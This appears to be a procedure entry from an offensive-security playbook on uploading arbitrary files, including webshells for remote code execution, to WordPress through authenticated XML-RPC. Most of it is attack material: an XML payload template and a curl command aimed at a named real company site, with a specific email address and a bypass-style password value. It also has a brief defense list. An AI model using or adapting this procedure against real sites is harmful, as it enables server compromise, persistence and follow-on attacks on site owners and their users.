---
tags:
  - file-upload
  - xmlrpc
type: procedure
tools:
  - '[[tools/Curl-for-XMLRPC-Exploitation]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:31:52.544Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 78647878-5bc4-4c16-a346-4992d408e13e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-File-via-XMLRPC

## Summary

Uploads arbitrary files to WordPress media library via authenticated XMLRPC using metaWeblog.newMediaObject, potentially leading to RCE if webshell uploaded.

## Description

Post-auth, encode file (name, type, bits) in XML and send. File saved to /wp-content/uploads/; extensions limited by privileges. Useful for persistence or exploit chaining.

## Requirements

1. Authenticated XMLRPC session
2. File to upload (e.g., image or script)
3. XML payload with base64-encoded bits
4. Curl tool

## Defense

Defensive measures and detection strategies:

- Restrict file types in uploads via plugins
- Scan uploads for malware
- Monitor metaWeblog.newMediaObject logs
- Block XMLRPC file uploads with mod_security

## Objectives

1. Place files on server
2. Test upload restrictions
3. Enable further attacks like RCE

## Instructions

### Step 1: Prepare Upload XML

**Context**: Encode file contents as base64 in XML.

**Command**:
```bash
# upload.xml example:
# <?xml version="1.0"?>
# <methodCall>
# <methodName>metaWeblog.newMediaObject</methodName>
# <params>
# <param><value><string>1</string></value></param>
# <param><value><string>cbarry@uber.com</string></value></param>
# <param><value><string>@@@nopass@@@</string></value></param>
# <param><value><struct>
# <member><name>name</name><value><string>test.jpg</string></value></member>
# <member><name>type</name><value><string>image/jpeg</string></value></member>
# <member><name>bits</name><value><base64>[base64 file content]</base64></value></member>
# </struct></value></param>
# </params>
# </methodCall>
```

> Prepares the media object.

### Step 2: Send Upload Request

**Context**: POST to create attachment.

**Command**:
```bash
curl 'https://newsroom.uber.com/xmlrpc.php' --data-binary "`cat upload.xml`" -H 'Content-type: application/xml'
```

> Returns URL and ID; check /wp-content/uploads/.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Curl-for-XMLRPC-Exploitation]]

## Tags

- file-upload
- xmlrpc
